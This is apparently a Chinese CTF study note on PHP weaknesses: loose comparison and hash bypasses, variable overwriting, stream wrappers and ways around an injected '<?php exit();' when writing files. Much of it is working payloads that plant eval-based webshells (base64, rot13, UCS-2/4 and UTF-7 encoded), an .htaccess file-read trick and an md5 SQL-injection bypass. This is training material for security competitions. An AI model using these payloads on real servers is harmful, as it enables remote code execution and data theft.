123456789‘’ == 0 == false&#x27;123&#x27; == 123&#x27;abc&#x27; == 0&#x27;123a&#x27; == 123 &#x27;0x01&#x27; == 1&#x27;0e123456789&#x27; == &#x27;0e987654321&#x27; [false] == [0] == [NULL] == [&#x27;&#x27;]NULL == false == 0true == 1 如果 switch是数字类型的case判断时，switch会将其中的参数转换为int类型 123456789101112131415&lt;?phphighlight_file(__FILE__);$i = &quot;3name&quot;;switch($i)&#123; case 0: case 1: case 2: echo &quot;two&quot;; break; case 3: echo &quot;flag&quot;; break;&#125;?&gt;最终的结果是 flag strcmp()问题：比较两个字符串，不区分大小写，strcmp(string $tr1,string $str2)函数是将两个字符串转换成Ascii之后去进行比较的，相同为1，不同为0，若string1 &gt; string2，返回&gt; 0；若string1 &lt; string2，返回&lt; 0;若string1 = string2，返回0 strcasecmp(string1, string2)：比较两个字符串，区分大小写 这两个函数无法处理数组，当出现数组时，返回null。(下例中@表示忽略警告) 12345678910&lt;?phpvar_dump(@strcmp([],&#x27;asd&#x27;)==0); //truevar_dump(@strcmp([],&#x27;asd&#x27;)===0); //falsevar_dump(strcmp(NULL,&#x27;asd&#x27;)==0); //falsevar_dump(@strcmp([],&#x27;asd&#x27;)); //NULLvar_dump(@strcmp([],123)); //NULLif(NULL==0)&#123; echo &quot;123&quot;; //123&#125;?&gt; is_numeric() 函数：判断变量是否为数字，是数字返回1，否则返回0 1234567891011echo is_numeric(1); //1echo is_numeric(&#x27;1&#x27;); //1echo is_numeric(0x1); //1echo is_numeric(&#x27;0x1&#x27;); //1var_dump(is_numeric([123])); //falsevar_dump(is_numeric(&#x27;123&#x27;)); //truevar_dump(is_numeric(&#x27;0x1&#x27;)); //bool(true)var_dump(is_numeric(&#x27;1a&#x27;)); //bool(false)var_dump(is_numeric([1])); //bool(false)echo is_numeric(&#x27;0e1&#x27;); //1var_dump(is_numeric(&#x27;0ea&#x27;)); //bool(false) in_array() 问题：in_array(search,array,type)，返回 bool array_search() 问题：在数组中搜索某个键值，并返回对应的键名 12345678在数组中搜索键值 &quot;red&quot;，并返回它的键名：&lt;?php$a=array(&quot;a&quot;=&gt;&quot;red&quot;,&quot;b&quot;=&gt;&quot;green&quot;,&quot;c&quot;=&gt;&quot;blue&quot;);echo array_search(&quot;red&quot;,$a); //输出的是 aif(array_search(&quot;red&quot;,$a)==a)&#123; echo &quot;success&quot;; //将会输出 success&#125;?&gt; 例题： 1234567891011121314151617181920212223&lt;?phphighlight_file(__FILE__);$flag = &quot;flag&#123;qwewqeqwd&#125;&quot;;if(!is_array($_GET[&#x27;test&#x27;]))&#123; exit();&#125;$test = $_GET[&#x27;test&#x27;];for($i = 0;$i &lt; count($test);$i++)&#123; if($test[$i]===&#x27;admin&#x27;)&#123; echo &quot;error&quot;; exit(); &#125; $test[$i] = intval($test[$i]);&#125; if(array_search(&#x27;admin&#x27;,$test)===0)&#123; echo $flag;&#125;else&#123; echo &quot;false&quot;;&#125;?&gt; 分析：=== 为 0 ，最简单的办法就是，两边类型不相同 WP：?test[]=0 或 ?test[0]=0 strpos() 问题：strpos(string,find,start)返回从 start开始，string中 find第一次出现的位置，位置是从0开始的 12var_dump(strpos(&#x27;abcd&#x27;,&#x27;a&#x27;)); //int(0) bool(true) var_dump(strpos(&#x27;abcd&#x27;,&#x27;a&#x27;)===0); //bool(true) 数组比较：php手册中写道，当数组(array)与任何非数组进行比较时，数组总是最大的 1234var_dump([]&gt;0); //bool(true)var_dump([]&gt;9999); //bool(true)var_dump([]&gt;&#x27;a&#x27;); //bool(true) #数组大于字符串var_dump([[]]&gt;[]); //bool(true) #自然二位数组大于一维数组 bool类型的true比较：bool类型的true跟任意字符可以弱类型相等 1var_dump(true == &#x27;a&#x27;); //bool(true) **md5() 与 sha1()**：md5(string,raw) md5 和 sha1 无法处理数组，但是 php 没有抛出异常，直接返回 fasle 12sha1([]) === falsemd5([]) === false md5 绕过 == ：由于md5值开头均为 0e 的数或字符串，对 == 来说是相同的（都是0）；对===来说，类型不同则不同。md5 值是 0e 开头的总结 **md5 绕过 ===**：由于md5()函数不能处理数组，所以在md5()遇到数组时会警告并且返回null，然而可以忽略警告并通过数组绕过=== 123var_dump(@md5([]) == @md5([])) //bool(true)var_dump(@md5([]) === @md5([])) //bool(true)，@表示忽略警告var_dump(null === null); //bool(true) md5 绕过 sql ：md5 和 sha1 支持第二个参数，如果为 true，则会将 hash 后的 16 进制字符串以 16 进制转成字符串的形式返回，如果在 SQL 语句中这样写，会存在注入的问题。 1234567提供一个字符串：ffifdyop，md5后，276f722736c95d99e921722cf9ed621c再转成字符串：&#x27;or&#x27;6É]™é!r,ùíb，即md5(&#x27;ffifdyop&#x27;,true) =&#x27;or&#x27;6É]™é!r,ùíb // 可以实现绕过 $password = &quot;ffifdyop&quot;; $sql = &quot;SELECT * FROM admin WHERE pass = &#x27;&quot;.md5($password,true).&quot;&#x27;&quot;; var_dump($sql); **sha1()**：列出 sha1() 开头是 0e的字符串 1234sha1(&#x27;aaroZmOk&#x27;) //0e66507019969427134894567494305185566735sha1(&#x27;aaK1STfY&#x27;) //0e76658526655756207688271159624026011393sha1(&#x27;aaO8zKZF&#x27;) //0e89257456677279068558073954252716165668sha1(&#x27;aa3OFF9m&#x27;) //0e36977786278517984959260394024281014729 preg_match() 返回 pattern 的匹配次数。 它的值将是0次（不匹配）或1次，因为**preg_match()在第一次匹配后 将会停止搜索。preg_match_all()不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()**返回 **false**。 1234567891011121314include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if(preg_match(&quot;/[0-9]/&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num))&#123; echo $flag; &#125;&#125;#WP:?num[]=1#当不按照正确的方式传参数时，将会认为是错误，而自动跳过正则的检查 1.2 PHP 变量覆盖变量覆盖参考 extract() 函数：extract() 函数 EXTR_OVERWRITE ​ 如果有冲突，覆盖已有的变量 EXTR_PREFIX_SAME ​ 如果有冲突，在变量名前加上前缀 EXTR_SKIP ​ 如果有冲突，不覆盖已有的变量 123456789&lt;?php$size = &quot;large&quot;;$var_array = array(&quot;color&quot; =&gt; &quot;blue&quot;, &quot;size&quot; =&gt; &quot;medium&quot;, &quot;shape&quot; =&gt; &quot;sphere&quot;);extract($var_array, EXTR_PREFIX_SAME, &quot;wddx&quot;);echo &quot;$color, $size, $shape, $wddx_size\\n&quot;;?&gt; //将会输出 blue, large, sphere, medium，即没有覆盖掉变量$size 123456789&lt;?php$size = &quot;large&quot;;$var_array = array(&quot;color&quot; =&gt; &quot;blue&quot;, &quot;size&quot; =&gt; &quot;medium&quot;, &quot;shape&quot; =&gt; &quot;sphere&quot;);extract($var_array, EXTR_OVERWRITE);echo &quot;$color, $size, $shape\\n&quot;;?&gt; //将会输出 blue, medium, sphere，已经覆盖掉了$size 那么当以上情况以 extract($_GET) 的形式出现时，就意味着用户可以直接覆盖掉变量了。 **trim(string,charlist)**：移除字符串两侧的空白字符或其他预定义字符 123456解释：移除字符串两侧的字符（&quot;Hello&quot; 中的 &quot;He&quot; 以及 &quot;World&quot; 中的 &quot;d!&quot;）：&lt;?php$str = &quot;Hello World!&quot;;echo $str . &quot;&lt;br&gt;&quot;;echo trim($str,&quot;Hed!&quot;);?&gt; 123相关函数： ltrim() - 移除字符串左侧的空白字符或其他预定义字符 rtrim() - 移除字符串右侧的空白字符或其他预定义字符 12345678如果charlist不写：默认移除 &quot; &quot; (ASCII 32 (0x20))，普通空格符。 &quot;\\t&quot; (ASCII 9 (0x09))，制表符。 &quot;\\n&quot; (ASCII 10 (0x0A))，换行符。 &quot;\\r&quot; (ASCII 13 (0x0D))，回车符。 &quot;\\0&quot; (ASCII 0 (0x00))，空字节符。 &quot;\\x0B&quot; (ASCII 11 (0x0B))，垂直制表符。 foreach() 遍历数组： 12345678&lt;?php $name = &quot;aaa&quot;;//传参 ?name=bbb foreach($_GET as $key =&gt; $val)&#123; $$key = $val; //将变成 $name = bbb &#125; var_dump($name); //这样相当于将上面的$name的值通过我们的GET传参进行了修改?&gt; 例题： 1234567891011121314151617181920212223&lt;?php$flag = &quot;flag&#123;nishizuibangde!&#125;&quot;;highlight_file(__FILE__);$_403 = &quot;Access Denied&quot;;$_200 = &quot;Welcome Admin&quot;;if($_SERVER[&#x27;REQUEST_METHOD&#x27;] != &quot;POST&quot;)&#123; die();&#125;if(!isset($_POST[&#x27;flag&#x27;]))&#123; die($_403);&#125;foreach($_GET as $key =&gt; $value)&#123; $$key = $$value;&#125;foreach($_POST as $key =&gt; $value)&#123; $$key = $value;&#125;if($_POST[&#x27;flag&#x27;] !== $flag)&#123; die($_200);&#125;echo $flag;?&gt; **parse_str()**：将查询的字符串解析为变量，如果未设置array参数，由该函数设置的变量将覆盖已存在的同名变量。 12345678解释：将查询的字符串解析为变量&lt;?phpparse_str(&quot;name=Bill&amp;age=60&quot;);echo $name.&quot;&lt;br&gt;&quot;;echo $age;?&gt; //输出： Bill // 60 例题： 1234567891011121314151617&lt;?php//highlight_file(__FILE__);if(empty($_GET[&#x27;id&#x27;]))&#123; show_source(__FILE__); die();&#125;else&#123; $a = &#x27;www.baidu.com&#x27;; $id = $_GET[&#x27;id&#x27;]; @parse_str($id); if($a[0] != &#x27;QNKCDZO&#x27; &amp;&amp; md5($a[0]) == md5(&#x27;QNKCDZO&#x27;))&#123; echo &quot;success&quot;; &#125;else&#123; exit(&#x27;false&#x27;); &#125;&#125;?&gt; //WP:?id=a[0]=240610708 找md5的值是 科学技术法 0e开头的，根据 PHP弱类型的比较，0e开头均为0 md5 值是 0e 开头的 **import_request_variables()**：可以在 register_global = off 时，把 GET/POST/Cookie 变量导入全局作用域中 版本要求：PHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0 例题： 1234567891011&lt;?phphighlight_file(__FILE__);$auth = &#x27;0&#x27;;import_request_variables(&#x27;G&#x27;);if($auth == 1)&#123; echo &quot;success&quot;;&#125;else&#123; echo &quot;false&quot;;?&gt; //输入 ?auth=1 //import_request_variables(&#x27;G&#x27;)指定导入GET请求中的变量，从而导致变量覆盖 全局变量注册开关问题：register_globals=On/Off，当是On的时候，传递过来的值会被直接注册为 全局变量 直接使用 参考一 ini_get() : 获取一个配置选项的值 例一： 123456&lt;?php //?id=1echo &quot;Register_globals: &quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;; echo &#x27;$_GET[&quot;id&quot;] :&#x27;.$_GET[&#x27;id&#x27;].&quot;&lt;br/&gt;&quot;;echo &#x27;$id :&#x27;.$id;?&gt; 例二： 12345678&lt;?php echo &quot;Register_globals: &quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;; if (ini_get(&#x27;register_globals&#x27;)) foreach($_REQUEST as $k=&gt;$v) unset($&#123;$k&#125;); print $a.&quot;&lt;br/&gt;&quot;; print $_GET[b]; ?&gt; //?GLOBALS[a]=1&amp;b=2,$a=1,$_GET[b]=2 即可覆盖 12345678910 &lt;?php highlight_file(__FILE__); echo &quot;Register_globals:&quot;.(int)ini_get(&quot;register_globals&quot;).&quot;&lt;br/&gt;&quot;; if (ini_get(&#x27;register_globals&#x27;)) foreach($_REQUEST as $k=&gt;$v) unset($&#123;$k&#125;); echo $a; echo &quot;&lt;br /&gt;&quot;;echo $_GET[b]; ?&gt; //输入 ?a=1&amp;b=2 unset($&#123;$k&#125;)的存在，无法覆盖 //输入 ?GLOBALS[a]=1&amp;b=2 使用全局变量，即可覆盖 1.3 执行命令 **system()**：在执行外部命令时，直接将结果输出到浏览器，不需要使用echo或return来查看结果， **passthru()**：直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。 **exec()**：执行系统外部命令时不会输出结果，而是返回结果的最后一行，需要使用echo等函数进行输出。如果你想得到结果你可以使用第二个参数，让其输出到指定的数组，此数组一个记录代表输出的一行，即如果输出结果有20行，则这个数组就有20条记录。 12345 &lt;?php echo exec(&quot;ping 127.0.0.1&quot;,$file); echo &quot;&lt;/br&gt;&quot;; print_r($file);?&gt; shell_exec() 与 反引号 ：shell_exec() 函数实际上仅是反引号()操作符的变体，都不会输出结果，需要使用echo等函数打印出结果。 二、PHP 伪协议PHP 伪协议 参考一 PHP 伪协议 参考二 PHP伪协议事实上就是支持的协议与封装协议 php:// — 访问各个输入/输出流（I/O streams） 说明： PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符、内存、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的 过滤器。 12php://filter/read=convert.base64-encode/resource=index.phpphp://filter/read=string.rot13/resource=index.php 2.1 php://filter是一种元封装器，设计用于数据流打开时的筛选过滤应用 参数： 使用： 123php://filter/resource=&lt;待过滤的数据流&gt;php://filter/read=&lt;读 链需要应用的过滤器列表&gt;php://filter/write=&lt;写 链需要应用的过滤器列表&gt; #可采用一个或以管道符 | 分隔的多个过滤器名称 示例： file_get_contents — 将整个文件读入一个字符串 file_put_contents — 将一个字符串写入文件 12345678&lt;?phphighlight_file(__FILE__);$file1 = $_GET[&#x27;file1&#x27;]; $file2 = $_GET[&#x27;file2&#x27;]; $txt = $_GET[&#x27;txt&#x27;]; echo file_get_contents($file1); file_put_contents($file2,$txt); ?&gt; 利用： 12345678# 获取文件file1=php://filter/resource=file.txt #明文file1=php://filter/read=convert.base64-encode/resource=file.txt #密文file1=php://filter/read=string.rot13/resource=file.txt# 写入文件?file2=php://filter/resource=test.txt&amp;txt=helloworld #明文file2=php://filter/write=convert.base64-encode/resource=test.txt&amp;txt=helloworld #密文 2.2 php://input php://input 是个可以访问请求的原始数据的只读流 enctype=&quot;multipart/form-data&quot; 的时候 php://input 是无效的 1234?path=php://input&lt;POST 部分&gt; &lt;?php phpinfo();?&gt; &lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt; 2.3 file:// 协议通常用来 读取本地文件 ，且不受allow_url_fopen与allow_url_include 的影响。include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。 测试： 123456&lt;?php$path = $_GET[&#x27;path&#x27;];if(isset($_GET[&#x27;path&#x27;]))&#123; include(&quot;$path&quot;);&#125;?&gt; 1234# 绝对路径?path=file://D:\\phpstudy_pro\\WWW\\learn\\phpin.php?path=file://D:/phpstudy_pro/WWW/learn/phpin.php?path=file:///D:/phpstudy_pro/WWW/learn/phpin.php 2.4 http:// 协议1?path=http://learn/phpin.php 2.5 php:// 协议条件： allow_url_fopen:off/on allow_url_include :仅php://input php://stdin php://memory php://temp 需要on 协议 作用 php://input 可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype=&quot;multipart/form-data&quot; 的时候php://input 是无效的。 php://output 只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。 php://fd (&gt;=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。 php://memory php://temp (&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。 php://filter (&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。 2.6 zip:// bzip2:// zlib:// 协议ip:// bzip2:// zlib:// 协议 条件： allow_url_fopen:off/on allow_url_include :off/on 作用：zip:// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。 zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23） 12# 压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ?path=zip://D:\\phpStudy_pro\\WWW\\learn\\phpinfo.jpg%23phpinfo.txt compress.bzip2://file.bz2 12# 压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）?path=compress.bzip2://D:\\phpStudy_pro\\WWW\\learn\\phpinfo.bz2 compress.zlib://file.gz 12# 压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）?path=compress.zlib://D:\\phpStudy_pro\\WWW\\learn\\phpinfo.gz 2.7 data:// 协议条件： allow_url_fopen:on allow_url_include :on 作用：自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。 用法： 12data://text/plain,data://text/plain;base64, data://text/plain, 1?path=data://text/plain,&lt;?php%20phpinfo();?&gt; data://text/plain;base64, 12?path=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2bPD9waHAKc3lzdGVtKCdscycpOwo/Pg== 2.8 http:// https:// 协议条件： allow_url_fopen:on allow_url_include :on 作用：常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。 用法： 123456http://example.comhttp://example.com/file.php?var1=val1&amp;var2=val2http://user:password@example.comhttps://example.comhttps://example.com/file.php?var1=val1&amp;var2=val2https://user:password@example.com 示例： 1?file=http://127.0.0.1/phpinfo.txt 2.9 phar:// 协议phar://协议与zip://类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例： 1?path=phar://D:\\phpStudy_pro\\WWW\\learn\\phpinfo.zip\\phpinfo.txt 2.10 扩展：phar://协议对象注入技术seebug - 利用 phar 拓展 php 反序列化漏洞攻击面 三、PHP过滤器PHP过滤器 3.1 字符串过滤器 string.rot13：自 PHP 4.3.0 起）使用此过滤器等同于用 str_rot13()函数处理所有的流数据 string.toupper：自 PHP 5.0.0 起）使用此过滤器等同于用 strtoupper()函数处理所有的流数据 转换为大写 string.tolower：自 PHP 5.0.0 起）使用此过滤器等同于用 strtolower()函数处理所有的流数据 转换为小写 string.strip_tags 等同于用 strip_tags()函数处理所有的流数据 可以用两种格式接收参数：一种是和 strip_tags()函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。 **strip_tags ( string $str , string $allowable_tags = ? ) **：从字符串中去除 HTML 和 PHP 标记 123456str 输入字符串。allowable_tags 使用可选的第二个参数指定不被去除的字符列表。注意:HTML 注释和 PHP 标签也会被去除。这里是硬编码处理的 3.2 转换过滤器转换过滤器 如同 string.* 过滤器，convert.* 过滤器的作用就和其名字一样。转换过滤器是 PHP 5.0.0 添加的。 convert.base64-encode &amp; convert.base64-decode convert.base64-encode和 convert.base64-decode使用这两个过滤器等同于分别用 base64_encode()和 base64_decode()函数处理所有的流数据。 ​ convert.base64-encode支持以一个关联数组给出的参数。如果给出了 line-length，base64 输出将被用 line-length个字符为 长度而截成块。如果给出了 line-break-chars，每块将被用给出的字符隔开。这些参数的效果和用 base64_encode()再加上 chunk_split()相同。 convert.quoted-printable-encode &amp; convert.quoted-printable-decode convert.quoted-printable-encode和 convert.quoted-printable-decode使用此过滤器的 decode 版本等同于用 quoted_printable_decode()函数处理所有的流数据。 没有和 convert.quoted-printable-encode相对应的函数。 convert.quoted-printable-encode支持以一个关联数组给出的参数。除了支持和 convert.base64-encode一样的附加参数外， convert.quoted-printable-encode还支持布尔参数 binary和 force-encode-first。 convert.base64-decode只支持 line-break-chars参数作为从编码载荷中剥离的类型提示。 12345&lt;?php $filename=$_GET[&#x27;filename&#x27;]; $content=$_GET[&#x27;content&#x27;]; file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);?&gt; **convert.iconv.***：过滤器需要 php 支持 iconv，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用 iconv()函数 处理所有的流数据。 使用：将字符串从编码方式转换为 编码方式。 123convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; or convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt; 支持的编码方式： 12345678910111213141516UCS-4*UCS-4BEUCS-4LE*UCS-2UCS-2BEUCS-2LEUTF-32*UTF-32BE*UTF-32LE*UTF-16*UTF-16BE*UTF-16LE*UTF-7UTF7-IMAPUTF-8*ASCII* 3.3 压缩过滤器压缩过滤器 使用 zlib.deflate 压缩： 1php://filter/zlib.deflate/resource=flag.php 使用 inflate 解压： 12php://filter/zlib.deflate|zlib.inflate/resource=flag.php bzip2.compress 和 bzip2.decompress 与上同 3.4 加密过滤器加密过滤器 mcrypt. 和 mdecrypt.** mcrypt.*和 mdecrypt.*使用 libmcrypt 提供了对称的加密和解密。这两组过滤器都支持 mcrypt 扩展库中相同的算法，格式为 mcrypt.ciphername，其中 ciphername是密码的名字，将被传递给 mcrypt_module_open()。有以下五个过滤器参数可用： short_open_tag：php.ini 当中的该配置为 On，意味着可以使用 短标签，将 &lt;?php ?&gt; 替换为 &lt;? ?&gt; ，并且在该种情况下，&lt;?= 表示 &lt;? echo 四、实战之死亡绕过4.1 bypass不同变量1234&lt;?php$filename=$_GET[&#x27;filename&#x27;];$content=$_GET[&#x27;content&#x27;];file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content); $content在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？ 思路其实也很简单我们只要将content前面的那部分内容使用某种手段（编码等）进行处理，导致php不能识别该部分就可以了。 这里的$_GET[‘filename’]是可以控制协议的. 4.1.1 base64绕过base64原理请看这里 Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、/）将任意字节序列数据编码成ASCII字符串，另有“=”符号用作后缀用途。 base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码 当$content被加上了以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt; ? ; &gt; 空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有”phpexit”和我们传入的其他字符。 由于，”phpexit”一共7个字符，但是base64算法解码时是4个byte一组，所以我们可以随便再给他添加一个字符。这样前边的phpexit加上另一个字符就会被base64解码，然后后边的我们精心构造的base64字符串也会被成功解码为php代码。 payload: 1?filename=php://filter/write=convert.base64-decode/resource=1.php&amp;content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw== 成功写入 4.1.2 rot13绕过 str_rot13() str_rot13() 函数对字符串执行 ROT13 编码。ROT13 编码是把每一个字母在字母表中向前移动 13 个字母得到。数字和非字母字符保持不变。编码和解码都是由相同的函数完成的。如果您把一个已编码的字符串作为参数，那么将返回原始字符串。 利用php://filter中string.rot13过滤器去除”exit”。string.rot13的特性是编码和解码都是自身完成，利用这一特性可以去除exit。 &lt;?php exit; 在经过rot13编码后会变成 &lt;?cuc rkvg(); ，不过这种利用手法的前提是PHP不开启short_open_tag。 https://www.php.net/manual/zh/ini.core.php 虽然官方说的默认开启，但是在php.ini中默认是注释掉的，也就是说它还是默认关闭。但是我本地 phpstudy 是开启的，导致执行payload后： Parse error: syntax error, unexpected &#39;rkvg&#39; (T_STRING) in E:\\phpstudy_pro\\WWW\\1\\2.php on line 1 &lt;?php eval($_POST[a]); rot13编码后 &lt;?cuc riny($_CBFG[n]); payload: 1?filename=php://filter/write=string.rot13/resource=2.php&amp;content=&lt;?cuc riny($_CBFG[n]); 成功写入文件 2.php &lt;?cuc rkvg();&lt;?php eval($_POST[a]); 在关闭 short_open_tag = Off 的情况下，可以 成功执行命令 string.strip_tags strip_tags — 从字符串中去除 HTML 和 PHP 标记。该函数尝试返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果。它使用与函数 fgetss() 一样的机制去除标记。 但是我们的目的是写入webshell，如果那样的话，我们的webshell岂不是同样起不了作用，不过我们可以使用多个过滤器进行绕过这个限制（php://filter允许通过 | 使用多个过滤器）。 123451、webshell用base64编码 //为了避免strip_tags的影响2、调用string.strip_tags //这一步将去除&lt;?php exit; ?&gt;3、调用convert.base64-decode //这一步将还原base64编码的webshell payload: ?filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=3.php&amp;content=?&gt;PD9waHAgZXZhbCgkX1BPU1RbYV0pOw== 成功写入： &lt;?php eval($_POST[a]); .htaccess的预包含利用PHP中auto_prepend_file与auto_append_file用法实例分析: https://www.jb51.net/article/55468.htm payload ?filename=php://filter/write=string.strip_tags/resource=.htaccess&amp;content=?&gt;php_value auto_prepend_file%20&quot;/flag&quot; 4.2 bypass相同变量123&lt;?php$content = $_GET[content];file_put_contents($content,&#x27;&lt;?php exit();&#x27;.$content); 这种情况下写入的文件，其文件名和文件部分内容一致，这就导致利用的难度大大增加了，不过最终目的还是相同的：都是为了去除文件头部内容exit这个关键代码写入shell后门。 base64构造： content=php://filter/convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=shell.php 或 content=php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php 进行拼接之后就是 &lt;?php exit();php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php 然后会对其进行一次整体的 base64-decode 。从而分解掉死亡代码， 但是无法生成content；虽然文件创建成功，但是就是无法生成content。问题在于resource 后边的 =； ‘=’在base64中的作用是填充，也就是以为着结束；在‘=’的后面是不允许有任何其他字符的否则会报错， 这里因为是由于‘=’从而使得我们写入content不成功，那么我们可以想个方法去掉等号即可， 去掉等号之过滤器嵌套base64payload: content=php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php 发现可以生成文件，并且可以看到我们已经成功写入了shell；但是文件名确实有问题，当我们在浏览器访问的时候，会出现访问不到的问题，这里是因为引号的问题；那么如何避免，我们可以使用伪目录的方法，进行变相的绕过去； payoad: content=php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../shell.php 我们将前面的一串base64字符和闭合的符号整体看作一个目录，虽然没有，但是我们后面重新撤回了原目录，生成shell.php文件；从而就可以生成正常的文件名. 去掉等号之直接对内容进行变性另类base64其实这种也是借助于过滤器，但是原理并不是和之前的原理一样，之前的原理即是：闭合原本的死亡代码，然后在进行过滤器过滤掉内容中的html标签，从而对剩下的内容进行base64解码。但是这种方法却不是如此，payload如下： php://filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../shell.php 这种payload的攻击原理即是首先直接在内容时，就将我们base64遇到的‘=’这个问题直接写在中进行过滤掉，然后base64-decode再对原本内容的&lt;?php exit();进行转码，从而达到分解死亡代码的效果 rot13 绕过尽管base64比较特别，但是并不是所有的编码都受限于‘=’，这里可以采用rot13编码即可； payload content=php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=shell.php content=php://filter/write=string.rot13/resource=&lt;?cuc cucvasb();?&gt;/../shell.php 生成文件内容： &lt;?cuc rkvg();cuc://svygre/jevgr=fgevat.ebg13|&lt;?php phpinfo();?&gt;|/erfbhepr=f1zcyr.cuc 其原理就是利用转码从而将原本的死亡代码进行转码从而使引擎无法识别从而避免死亡代码； convert.iconv.*对于iconv字符编码转换进行绕过的手法，其实类似于上面所述的base64编码手段，都是先对原有字符串进行某种编码然后再解码，这个过程导致最初的限制exit;去除，而我们的恶意代码正常解码存储。 usc-2 通过UCS-2方式，对目标字符串进行2位一反转（这里的2LE和2BE可以看作是小端和大端的列子），也就是说构造的恶意代码需要是UCS-2中2的倍数，不然不能进行正常反转（多余不满足的字符串会被截断），那我们就可以利用这种过滤器进行编码转换绕过了 1echo iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php @eval($_POST[ab]);?&gt;&#x27;); payload: php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSa[]b;)&gt;?/resource=shell.php 成功向 shell.php 写入 ?&lt;hp pxeti)(p;ph/:f/liet/rocvnre.tcino.vCU-SL2.ECU-SB2|E&lt;?php @eval($_POST[ab]);?&gt;r/seuocr=ehsle.lhp usc-4通过UCS-4方式，对目标字符串进行4位一反转（这里的4LE和4BE可以看作是小端和大端的列子），也就是说构造的恶意代码需要是UCS-4中4的倍数，不然不能进行正常反转（多余不满足的字符串会被截断），那我们就可以利用这种过滤器进行编码转换绕过了. 12&lt;?phpecho iconv(&quot;UCS-4LE&quot;,&quot;UCS-4BE&quot;,&#x27;&lt;?php @eval($_POST[abcd]);?&gt;&#x27;); 28字符 &lt;?php @eval($_POST[abcd]);?&gt; 转为 hp?&lt;e@ p(lavOP_$a[TS]dcb&gt;?;) payload: content=php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$a[TS]dcb&gt;?;)/resource=shell.php 成功写入： hp?&lt;xe p)(tiphp;f//:etlioc/rrevnci.t.vno-SCU.EL4-SCU|EB4&lt;?php @eval($_POST[abcd]);?&gt;ser/cruohs=e.lle utf8-utf7 这里发现生成的是+AD0-,然而经过检测，此字符串可以被base64进行解码；那也就意味着我们可以使用这种方法避免等号对我们base64解码的影响；我们可以直接写入base64加密后的payload，然后将其进行utf之间的转换，因为纯字符转换之后还是其本身；所以其不受影响，进而我们的base64-encode之后的编码依然是存在的，然后进行base64-decode一下，写入shell. Payload: content=php://filter/write=aaaaXDw/cGhwIEBldmFsKCRfUE9TVFthXSk7ID8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php ps： 